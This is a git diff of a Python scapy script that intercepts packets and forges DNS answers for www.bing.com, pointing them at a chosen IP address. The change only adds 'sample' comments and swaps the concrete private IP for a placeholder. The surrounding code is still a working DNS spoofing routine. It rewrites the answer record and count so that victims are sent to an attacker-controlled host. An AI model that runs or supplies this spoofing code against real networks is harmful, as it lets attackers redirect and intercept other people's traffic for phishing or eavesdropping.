@@ -7,9 +7,9 @@ def process_packet(packet):
     my_packet = scapy.IP(packet.get_payload())
     if my_packet.haslayer(scapy.DNSRR):
         qname = my_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.bing.com" in qname:  # sample domain
             print("[+] Spoofing target...")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.158")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.x.x")  # sample ip address
             my_packet[scapy.DNS].an = answer
             my_packet[scapy.DNS].ancount = 1
 
